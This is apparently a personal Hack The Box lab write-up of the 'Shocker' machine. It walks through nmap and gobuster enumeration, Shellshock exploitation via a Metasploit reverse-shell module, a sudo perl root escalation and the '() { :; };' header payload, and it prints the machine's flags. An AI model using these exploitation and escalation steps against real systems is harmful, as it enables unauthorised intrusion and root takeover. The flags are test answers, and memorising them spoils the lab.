# References
1. [Shocker Writeup (medium.com)](https://ranakhalil101.medium.com/hack-the-box-shocker-writeup-w-o-metasploit-feb9e5fa5aa2)
2. [Shocker Writeup (netosec.com)](https://netosec.com/shocker-hackthebox-writeup/)
3. [Shocker Writeup (clearinfosec.com)](https://clearinfosec.com/shocker-hackthebox-walkthrough/)
4. [Shocker Writeup (ethicalhacs.com)](https://ethicalhacs.com/shocker-hackthebox-walkthrough/)

# Summary
### 1. NMAP
x

### 2. Port 80 HTTP Enumeration
x

### 3. Deeper Gobuster Enumeration
x

### 4. Port 80 Shellshock Exploitation (Metasploit)
x

### 5. Privilege Escalation
x

### 6. Alternative Port 80 Shellshock Exploitation (Curl)

# Attack
## 1. NMAP
Damn, it's been long since I did a new HTB. Let's begin.
```
hippoeug@kali:~$ nmap 10.129.1.175 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 22:12 +08
...
Scanning 10.129.1.175 [1000 ports]
Discovered open port 80/tcp on 10.129.1.175
Increasing send delay for 10.129.1.175 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 2222/tcp on 10.129.1.175
...
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)                                                                                                        
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
Only 2 ports, not much to enumerate, nice.

And a quick vulnerability script.
```
hippoeug@kali:~$ nmap --script vuln 10.129.1.175 -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 22:14 +08
...
Scanning 10.129.1.175 [1000 ports]
Discovered open port 80/tcp on 10.129.1.175
Increasing send delay for 10.129.1.175 from 0 to 5 due to 13 out of 43 dropped probes since last increase.
Discovered open port 2222/tcp on 10.129.1.175
...
PORT     STATE SERVICE
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
2222/tcp open  EtherNetIP-1
...
```
Nothing from this.

## 2. Port 80 HTTP Enumeration
Let's do a quick visit to `http://10.129.1.175`.

![Port80](https://user-images.githubusercontent.com/21957042/116421006-0f83d180-a871-11eb-94d0-0c8e2ef62494.png)

Hmm, nothing much on this page. Surely there must be more things here. Let's look at Gobuster.
```
hippoeug@kali:~$ gobuster dir -u "http://10.129.1.175" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.1.175
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/04/28 22:24:40 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2021/04/28 22:36:09 Finished
===============================================================
```
What?! Only `/server-status`? Nevertheless, let's take a look at it.

![ServerStatus](https://user-images.githubusercontent.com/21957042/116423255-1a3f6600-a873-11eb-9acd-62ea260ef40b.png)

Forbidden. Hmm. 

As it turns out, our Gobuster did not append a slash at the back of the directory searches.

The flag `-f` adds a slash at the back of the directory, and Gobuster gave us more results.
```
hippoeug@kali:~$ gobuster dir -u "http://10.129.139.89" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -f
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.139.89
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Add Slash:      true
[+] Timeout:        10s
===============================================================
2021/05/01 20:17:41 Starting gobuster
===============================================================
/icons/ (Status: 403)
/cgi-bin/ (Status: 403)
/server-status/ (Status: 403)
===============================================================
2021/05/01 20:29:13 Finished
===============================================================
```
Without the slash, Gobuster sees a `404 Not Found` error and hence did not report it.

![cgibin2](https://user-images.githubusercontent.com/21957042/116782264-9f688c00-aaba-11eb-9e0b-4128f20fbeb5.png)

With the slash, it sees the directory and gives a result.

![cgibin1](https://user-images.githubusercontent.com/21957042/116782263-9e375f00-aaba-11eb-9c52-11aaaf2bf119.png)
![icons](https://user-images.githubusercontent.com/21957042/116782266-a0012280-aaba-11eb-9691-e022c35a1456.png)

But still, we are getting `403 Forbidden` error and we do not have anything useful to work with.

## 3. Deeper Gobuster Enumeration
After getting stuck, I had to look online for clues.

It turns out we need to enumerate deeper using Gobuster. We are looking for files (cgi, sh, pl, py) within the subdirectories we found.
```
hippoeug@kali:~$ gobuster dir -u "http://10.129.139.89/cgi-bin/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x cgi,sh,pl,py
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.139.89/cgi-bin/
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     cgi,sh,pl,py
[+] Timeout:        10s
===============================================================
2021/05/01 20:41:02 Starting gobuster
===============================================================
/user.sh (Status: 200)
===============================================================
2021/05/01 21:38:43 Finished
===============================================================
```
A file `/user.sh` exists! Let's see what we get at `http://10.129.139.89/cgi-bin/user.sh`

![user sh](https://user-images.githubusercontent.com/21957042/116787364-24ad6a00-aad6-11eb-98f3-cc47dedf0c6c.png)

We download the file to look at the content.
```
Content-Type: text/plain

Just an uptime test script

 11:35:37 up  3:35,  0 users,  load average: 0.00, 0.00, 0.00
```
Hmm, nothing much. Again, I am stuck. As I look and quote from [Reference 4](https://ethicalhacs.com/shocker-hackthebox-walkthrough/), he mentions the `/cgi-bin/user.sh` file is executing everytime we access it, as the time in the file changes everytime. The file `user.sh` is also a bash script, in a `/cgi-bin/` directory.

Since the machine name is called `Shocker`, these clues combined should give it away that it could have a Shellshock vulnerability.

## 4. Port 80 Shellshock Exploitation (Metasploit)
We can do a NMAP with [script](https://nmap.org/nsedoc/scripts/http-shellshock.html) to detect if Shellshock would work.
```
hippoeug@kali:~$ nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.129.139.89 -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 20:54 +08
...
Scanning 10.129.139.89 [1000 ports]
Discovered open port 80/tcp on 10.129.139.89
Discovered open port 2222/tcp on 10.129.139.89
...
PORT     STATE SERVICE
80/tcp   open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
2222/tcp open  EtherNetIP-1
...
```
Indeed it appears to be vulnerable to the Shellshock vulnerability.

Let's search for some Shellshock exploits by Googling `metasploit shellshock`. One of the top results returned with [Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec/), Metasploit module `exploit/multi/http/apache_mod_cgi_bash_env_exec`.

We also do a quick search on msfconsole itself.
```
hippoeug@kali:~$ msfconsole
msf6 > search shellshock

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
   2   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   3   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
   4   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   6   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
   8   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
   9   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
   11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)


Interact with a module by name or index. For example info 11, use 11 or use exploit/unix/smtp/qmail_bash_env_exec
```
Yeap. 

Let's just go with `exploit/multi/http/apache_mod_cgi_bash_env_exec`.
```
hippoeug@kali:~$ msfconsole
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI                        yes       Path to CGI script
   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random)
   VHOST                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.x.x  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 10.129.139.89
rhost => 10.129.139.89
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/user.sh
targeturi => /cgi-bin/user.sh
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (980808 bytes) to 10.129.139.89
[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.129.139.89:43848) at 2021-05-02 00:33:27 +0800

meterpreter >
```
And a shell!

Let's get flags.
```
meterpreter > pwd
/usr/lib/cgi-bin
meterpreter > getuid
Server username: shelly @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000)
...
meterpreter > pwd
/home/shelly
meterpreter > cat user.txt
269772aeb3c671e933017e412063eab9
```
We don't have root privileges, and will have to privilege escalate to get the root flag.

## 5. Privilege Escalation
Let's do our usual quick enumeration with `sudo -l`.
```
meterpreter > shell 
Process 2576 created.
Channel 2 created.
 
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
Ooh! We can run `perl` as root. If this fails, we could probably look at SUID configurations or services or things like that.

From online references [1](https://www.hacknos.com/perl-python-ruby-privilege-escalation-linux/) & [2](https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/), here is where I learnt you can launch a shell using `perl`.
```
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
sudo perl -e 'exec("/bin/bash")'
id
uid=0(root) gid=0(root) groups=0(root)
```
Simply by running `sudo perl -e 'exec("/bin/bash")'`, we got root privileges.

Let's find the root flags.
```
pwd
/root
ls
root.txt
cat root.txt
827704ec5f851e6b2a7c3b895f1e044f
```

## 6. Alternative Port 80 Shellshock Exploitation (Curl)
Let me quote [blogl.cloudflare.com](https://blog.cloudflare.com/inside-shellshock/):

"Shellshock occurs when the variables are passed into the shell called "bash". Bash is a common shell used on Linux systems. 
Web servers quite often need to run other programs to respond to a request, and it's common that these variables are passed into bash or another shell.

The Shellshock problem specifically occurs when an attacker modifies the origin HTTP request to contain the magic `() { :; };` string discussed above.

Suppose the attacker change the User-Agent header above from `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/37.0.2062.124 Safari/537.36` to simply `() { :; }; /bin/eject`. This creates the following variable inside a web server: `HTTP_USER_AGENT=() { :; }; /bin/eject`.

If that variable gets passed into bash by the web server, the Shellshock problem occurs. This is because bash has special rules for handling a variable starting with () { :; };. Rather than treating the variable HTTP_USER_AGENT as a sequence of characters with no special meaning, bash will interpret it as a command that needs to be executed.

The problem is that HTTP_USER_AGENT came from the User-Agent header which is something an attacker controls because it comes into the web server in an HTTP request. And that's a recipe for disaster because an attacker can make a vulnerable server run any command it wants."

Knowing this now, we can run a `curl` command with the malicious string `() { :; };` and spawn a reverse shell from there.

Let's run that malicious string in `User-Agent`.
```
```
